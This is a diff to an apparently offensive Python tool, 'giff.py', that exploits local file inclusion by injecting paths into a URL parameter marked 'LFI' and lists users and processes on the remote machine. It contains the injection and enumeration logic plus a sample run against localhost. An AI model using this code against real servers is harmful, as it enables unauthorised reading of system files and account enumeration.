@@ -49,9 +49,10 @@ class InfosFromMachine():
         
         if method.lower() == "get":
             if template != "":
-               if template not in str(input):
-                   print("[-] LFI is not present in your URL: Please, indicate where to inject")
-                   sys.exit()
+                if str(input).find(template) == 0:
+                    print(template)
+                    print("[-] LFI is not present in your URL: Please, indicate where to inject!")
+                    sys.exit()
                 u = url.replace(template, str(input))
                 r = requests.get(u)
                 if len(r.content) > 3 and self.verbose:
@@ -187,7 +188,7 @@ class InfosFromMachine():
         
         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         $ python3 giff.py -u http://127.0.0.1/page.php?p=LFI --users
-        [*] The following URL is targeted : http://127.0.0.1/page.php?p=LFI
+        [*] The following URL is targeted : http://127.0.0.1/page.php?p=
         [*] Users found:
         root
         sss
@@ -225,8 +226,9 @@ class InfosFromMachine():
         
         if args.users:
             self.get_users()
-            for user in self.users:
-                print(f"{user}")
+            print("List of users in remote system:")
+            for uid,name in self.users.items():
+                print(f"{name.decode()}:{uid.decode()}")
         
         if args.ps:
             self.get_users()
@@ -237,6 +239,8 @@ class InfosFromMachine():
         
 
 if __name__ ==  "__main__":
+
+    
     ifm = InfosFromMachine()
     ifm.main()
     sys.exit(0)
